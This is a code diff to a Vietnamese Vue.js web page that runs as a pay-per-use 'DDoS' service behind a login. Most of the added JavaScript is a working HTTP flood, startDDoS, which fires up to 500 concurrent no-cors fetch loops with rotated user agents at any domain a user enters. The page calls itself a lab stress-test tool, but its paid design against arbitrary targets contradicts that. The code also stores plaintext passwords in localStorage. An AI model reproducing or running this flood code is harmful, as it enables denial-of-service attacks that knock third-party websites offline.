@@ -454,7 +454,6 @@
         .back-to-login-forgot span:hover {
             text-decoration: underline;
         }
-        /* Intro Avatar */
         .intro-avatar {
             width: 120px;
             height: 120px;
@@ -487,8 +486,8 @@
                 <button class="btn-login" @click="login">ĐĂNG NHẬP</button>
                 <hr class="divider" />
                 <div class="bottom-links">
-                    <span class="forgot-link" @click="showForgotPassword = true">Quên mật khẩu?</span>
-                    <span class="register-link" @click="showRegisterOnly = true">Đăng Ký Ngay</span>
+                    <span class="forgot-link" @click="showForgotPassword = true; showRegisterOnly = false">Quên mật khẩu?</span>
+                    <span class="register-link" @click="showRegisterOnly = true; showForgotPassword = false">Đăng Ký Ngay</span>
                 </div>
             </div>
 
@@ -509,7 +508,7 @@
                     <input v-model="regPass" type="password" placeholder="Nhập mật khẩu" />
                 </div>
                 <button class="btn-register" @click="register">ĐĂNG KÝ</button>
-                <div class="back-to-login" @click="showRegisterOnly = false">
+                <div class="back-to-login" @click="showRegisterOnly = false; showForgotPassword = false">
                     ← <span>Quay lại đăng nhập</span>
                 </div>
             </div>
@@ -525,7 +524,7 @@
                         <input v-model="forgotEmail" type="email" placeholder="Nhập email của bạn" />
                     </div>
                     <button class="btn-send-code" @click="sendResetCode">Gửi mã xác nhận</button>
-                    <div class="back-to-login-forgot" @click="showForgotPassword = false">
+                    <div class="back-to-login-forgot" @click="showForgotPassword = false; forgotStep2 = false">
                         ← <span>Quay lại đăng nhập</span>
                     </div>
                 </div>
@@ -722,7 +721,7 @@
             <hr />
             <img src="https://cdn.upanhlaylink.com/i/eqCaUShn.jpeg" alt="Avatar" class="intro-avatar" />
             <p class="text-center"><strong>Chủ sở hữu:</strong> <span class="text-primary fw-bold">Đỗ Quốc Nam</span></p>
-            <p><strong>Web ra đời:</strong> Từ năm 2024 với mục đích cung cấp công cụ kiểm tra stress test cho các hệ thống trong môi trường Lab.</p>
+            <p><strong>Web ra đời:</strong> Từ năm 2026 với mục đích cung cấp công cụ kiểm tra stress test cho các hệ thống trong môi trường Lab.</p>
             <p><strong>Sứ mệnh:</strong> Hỗ trợ các kỹ sư bảo mật và quản trị viên hệ thống kiểm tra khả năng chịu tải của website.</p>
             <p><strong>Cam kết:</strong> Sử dụng đúng mục đích học tập và nghiên cứu, không sử dụng cho mục đích tấn công trái phép.</p>
             <div class="text-center mt-3">
@@ -813,4 +812,255 @@ new Vue({
             reader.readAsDataURL(file);
             this.$refs.avatarInput.value = '';
         },
-        login
+        login() {
+            this.loginError = '';
+            const found = this.users.find(u => u.username===this.loginUser && u.password===this.loginPass);
+            if(found) { 
+                this.currentUser = found; 
+                this.activeMenu='ddos';
+                this.addLog('✅ Đăng nhập thành công', 'sent');
+                this.showRegisterOnly = false;
+                this.showForgotPassword = false;
+                this.loginUser = '';
+                this.loginPass = '';
+            } else {
+                this.loginError = 'Sai tên đăng nhập hoặc mật khẩu';
+            }
+        },
+        register() {
+            if(!this.regUser || !this.regPass || !this.regEmail) return alert('Vui lòng nhập đầy đủ thông tin');
+            if(this.users.find(u=>u.username===this.regUser)) return alert('Tên đã tồn tại');
+            if(this.users.find(u=>u.email===this.regEmail)) return alert('Email đã được sử dụng');
+            this.users.push({ 
+                id: Date.now(), 
+                username: this.regUser, 
+                password: this.regPass, 
+                email: this.regEmail,
+                role: 'user', 
+                balance: 0, 
+                avatar: null 
+            });
+            this.saveUsers();
+            alert('Đăng ký thành công! Vui lòng đăng nhập.');
+            this.regUser = '';
+            this.regPass = '';
+            this.regEmail = '';
+            this.showRegisterOnly = false;
+        },
+        forgotPassword() {
+            // Chuyển sang form quên mật khẩu
+            this.showForgotPassword = true;
+            this.showRegisterOnly = false;
+        },
+        sendResetCode() {
+            const user = this.users.find(u => u.email === this.forgotEmail);
+            if(!user) return alert('Email không tồn tại trong hệ thống');
+            // Tạo mã ngẫu nhiên 6 số
+            const code = Math.floor(100000 + Math.random() * 900000).toString();
+            localStorage.setItem('reset_code_' + user.id, code);
+            localStorage.setItem('reset_email_' + user.id, this.forgotEmail);
+            alert(`Mã xác nhận đã gửi đến email ${this.forgotEmail}\nMã của bạn: ${code} (demo)`);
+            this.forgotStep2 = true;
+        },
+        verifyResetCode() {
+            if(!this.resetCode || !this.newPassword) return alert('Vui lòng nhập đầy đủ thông tin');
+            const user = this.users.find(u => u.email === this.forgotEmail);
+            if(!user) return alert('Không tìm thấy user');
+            const savedCode = localStorage.getItem('reset_code_' + user.id);
+            if(this.resetCode !== savedCode) return alert('Mã xác nhận không đúng');
+            user.password = this.newPassword;
+            this.saveUsers();
+            alert('Đổi mật khẩu thành công! Vui lòng đăng nhập lại.');
+            this.showForgotPassword = false;
+            this.forgotStep2 = false;
+            this.forgotEmail = '';
+            this.resetCode = '';
+            this.newPassword = '';
+            localStorage.removeItem('reset_code_' + user.id);
+        },
+        logout() { 
+            this.currentUser = null; 
+            this.stopFlag = true; 
+            this.isRunning = false;
+            this.showRegisterOnly = false;
+            this.showForgotPassword = false;
+            this.forgotStep2 = false;
+        },
+        napTien() {
+            if(this.napAmount < 5000) return alert('Tối thiểu 5,000₫');
+            if(!this.napNote.trim()) return alert('Vui lòng nhập ghi chú chuyển khoản');
+            
+            const user = this.users.find(u => u.id === this.currentUser.id);
+            if(user) {
+                user.balance = (user.balance || 0) + this.napAmount;
+                this.currentUser.balance = user.balance;
+                this.saveUsers();
+                
+                this.historyItems.push({
+                    id: Date.now(),
+                    type: 'nap',
+                    target: 'Nạp tiền',
+                    amount: this.napAmount,
+                    note: this.napNote,
+                    status: 'Thành công',
+                    time: new Date().toLocaleString(),
+                    requests: 0
+                });
+                this.saveHistory();
+                
+                this.addLog(`💰 Nạp ${this.formatCurrency(this.napAmount)}₫ thành công! Ghi chú: ${this.napNote}`, 'sent');
+                this.napAmount = 5000;
+                this.napNote = '';
+            }
+        },
+        addLog(msg, type='') {
+            this.logLines.push({ id: this.logId++, msg, type });
+            this.$nextTick(() => {
+                const el = document.querySelector('.log-area');
+                if(el) el.scrollTop = el.scrollHeight;
+            });
+        },
+        clearLog() { this.logLines = []; this.showDone = false; this.totalRequests = 0; },
+        async startDDoS() {
+            if(this.isRunning) return;
+            if(!this.targetUrl.trim()) return alert('Nhập tên miền');
+            
+            let url = this.targetUrl.trim();
+            if(!url.startsWith('http://') && !url.startsWith('https://')) {
+                url = 'http://' + url;
+            }
+            
+            const maxLimit = this.isAdmin ? 999999 : 1000;
+            if(this.maxRequests > maxLimit) {
+                alert(this.isAdmin ? 'Admin không giới hạn' : 'Số lần tối đa là 1000');
+                return;
+            }
+            
+            const user = this.users.find(u => u.id === this.currentUser.id);
+            if(user && user.balance !== Infinity && user.balance !== 'vô hạn') {
+                if(user.balance < 500) return alert('Số dư không đủ 500₫');
+                user.balance -= 500;
+                this.currentUser.balance = user.balance;
+                this.saveUsers();
+            }
+
+            const historyItem = {
+                id: Date.now(),
+                target: this.targetUrl.trim(),
+                amount: 500,
+                status: 'Đang duyệt',
+                time: new Date().toLocaleString(),
+                requests: 0
+            };
+            this.historyItems.push(historyItem);
+            this.saveHistory();
+
+            this.showDone = false; 
+            this.stopFlag = false; 
+            this.isRunning = true;
+            this.statusText = 'ĐANG TẤN CÔNG...'; 
+            this.totalRequests = 0; 
+            this.currentRPS = 0;
+            this.currentAttackCount = 0;
+
+            historyItem.status = 'Đang DDoS';
+            this.saveHistory();
+
+            const targetUrl = url;
+            const maxRequests = this.maxRequests;
+            const threads = Math.min(500, Math.max(1, this.threads));
+            const method = this.method;
+            
+            this.addLog(`🔥 Bắt đầu DDoS ${targetUrl} | ${maxRequests} lần, ${threads} luồng`, 'sent');
+
+            const uas = [
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
+                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
+                'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0) AppleWebKit/605.1.15'
+            ];
+
+            let requestCount = 0;
+            if(this.timerRPS) clearInterval(this.timerRPS);
+            this.timerRPS = setInterval(() => { 
+                this.currentRPS = Math.round(requestCount/2); 
+                requestCount = 0; 
+            }, 2000);
+
+            const sendRequest = async () => {
+                while (!this.stopFlag && this.currentAttackCount < maxRequests) {
+                    try {
+                        const controller = new AbortController();
+                        const timeout = setTimeout(() => controller.abort(), 1500);
+                        const opts = {
+                            method, 
+                            headers: { 
+                                'User-Agent': uas[Math.floor(Math.random()*uas.length)], 
+                                'Cache-Control': 'no-cache' 
+                            },
+                            signal: controller.signal, 
+                            mode: 'no-cors'
+                        };
+                        if(method === 'POST') { 
+                            opts.body = 'x='+Math.random(); 
+                            opts.headers['Content-Type'] = 'application/x-www-form-urlencoded'; 
+                        }
+                        await fetch(targetUrl, opts);
+                        clearTimeout(timeout);
+                        this.totalRequests++; 
+                        this.currentAttackCount++;
+                        requestCount++;
+                        if(this.currentAttackCount % 50 === 0) {
+                            this.addLog(`📤 Đã gửi ${this.currentAttackCount}/${maxRequests}`, '');
+                        }
+                    } catch(e) {
+                        this.totalRequests++; 
+                        this.currentAttackCount++;
+                        requestCount++;
+                        if(this.currentAttackCount % 100 === 0) {
+                            this.addLog(`⚠️ Lỗi: ${e.message || 'timeout'}`, 'fail');
+                        }
+                    }
+                }
+            };
+
+            const workers = [];
+            for(let i=0; i<threads; i++) {
+                workers.push(sendRequest());
+            }
+            await Promise.all(workers);
+
+            clearInterval(this.timerRPS); 
+            this.currentRPS = 0;
+            
+            historyItem.requests = this.currentAttackCount;
+            historyItem.status = 'Thành công';
+            this.saveHistory();
+            
+            this.attackLogs.push({ 
+                id: Date.now(), 
+                target: targetUrl, 
+                requests: this.currentAttackCount, 
+                duration: Math.round(this.currentAttackCount / (this.threads || 1)),
+                time: new Date().toLocaleString() 
+            });
+            this.saveLogs();
+
+            if(!this.stopFlag) {
+                this.showDone = true; 
+                this.statusText = 'ĐÃ HOÀN THÀNH';
+                this.addLog(`✅ ĐÃ XONG! Tổng: ${this.currentAttackCount} request`, 'sent');
+            } else {
+                this.statusText = 'ĐÃ DỪNG';
+                this.addLog(`⏹️ Dừng. Tổng: ${this.currentAttackCount}`, 'fail');
+            }
+            this.isRunning = false;
+        }
+    },
+    mounted() { 
+        this.initData();
+    }
+});
+</script>
+</body>
+</html>
